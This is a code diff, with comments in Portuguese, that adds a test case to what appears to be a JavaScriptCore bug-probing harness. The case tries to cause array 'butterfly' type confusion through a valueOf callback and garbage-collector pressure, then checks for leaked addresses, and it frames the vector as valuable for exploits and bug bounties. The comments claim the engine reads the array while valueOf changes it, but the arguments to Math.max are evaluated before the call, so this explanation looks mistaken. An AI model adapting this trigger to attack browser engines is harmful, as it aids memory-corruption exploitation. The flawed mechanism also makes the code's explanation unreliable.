@@ -497,6 +497,67 @@ export const Factory = {
             }
         });
 
+        // ══════════════════════════════════════════════════════════════
+        // 10. JSC Array Butterfly Type Confusion
+        //     C++: JSArray.cpp / JSObject.h
+        //     Risco: CRÍTICO — O vetor mais valioso para exploits e Bounties
+        // ══════════════════════════════════════════════════════════════
+        register({
+            id: 'JSC_ARRAY_BUTTERFLY_CONFUSION',
+            category: 'CoreJS',
+            risk: 'HIGH',
+            description: [
+                'Tenta forçar uma transição no JSCell IndexingType (de Double para Contiguous)',
+                'durante uma operação síncrona. Se o motor não atualizar o ponteiro do',
+                'Butterfly a tempo, ele vai ler um número Float como se fosse um',
+                'ponteiro de Objeto (vazando endereço) ou retornar undefined/null fantasma.'
+            ].join(' '),
+
+            setup: function() {
+                // Cria um array puro de Doubles (IndexingType = ALL_DOUBLE_INDEXING_TYPES)
+                this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
+                
+                // Um objeto malicioso que será injetado
+                this.evilObject = { 
+                    valueOf: () => {
+                        // O GATILHO: Durante uma conversão implícita, mudamos o tipo do array
+                        // ao injetar um objeto nele. Isso força a realocação do Butterfly
+                        // de Double para Contiguous (Objetos).
+                        this.vulnArray[1] = {};
+                        
+                        // Forçamos o GC para tentar limpar o Butterfly antigo
+                        let trash = [];
+                        for(let i=0; i<10; i++) trash.push(new ArrayBuffer(1024*1024));
+                        return 1337;
+                    }
+                };
+            },
+
+            trigger: function() {
+                try {
+                    // Operação que aciona leitura interna do C++ e chama o valueOf do evilObject
+                    // O C++ começa a ler assumindo que são Doubles, o evilObject muda o tipo a meio,
+                    // e o C++ termina a leitura com o tipo errado.
+                    Math.max(this.vulnArray[0], this.evilObject, this.vulnArray[2]);
+                } catch(e) {}
+            },
+
+            probe: [
+                // Se o Array sofreu Type Confusion, índices que eram números (ex: 3.3)
+                // podem subitamente ser interpretados como "undefined", "null" ou objetos corrompidos.
+                s => s.vulnArray[0],
+                s => s.vulnArray[2],
+                s => s.vulnArray[3],
+                s => s.vulnArray[4],
+                s => typeof s.vulnArray[3], // Era 'number'. Se for 'undefined' ou 'object', BINGO!
+            ],
+
+            cleanup: function() {
+                this.vulnArray = null;
+                this.evilObject = null;
+            }
+        });
+
         return list;
     }
 };
